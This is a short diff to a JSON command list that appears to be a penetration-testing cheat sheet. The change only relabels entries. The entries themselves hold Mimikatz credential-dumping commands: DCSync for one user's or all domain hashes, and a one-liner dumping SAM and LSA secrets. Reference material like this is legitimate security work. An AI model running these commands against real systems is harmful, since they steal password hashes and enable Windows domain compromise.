@@ -55,12 +55,12 @@
     {
       "command": "lsadump::dcsync /user:Administrator",
       "caption": "DCSync — dump specific user hash from DC replication (requires domain admin or replication rights)",
-      "label": "lsadump::dcsync"
+      "label": "DCSync - one user"
     },
     {
       "command": "lsadump::dcsync /domain:<domain> /all /csv",
       "caption": "DCSync — dump all domain hashes as CSV",
-      "label": "lsadump::dcsync"
+      "label": "DCSync - whole domain (CSV)"
     },
     {
       "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"lsadump::lsa /patch\" \"exit\"",
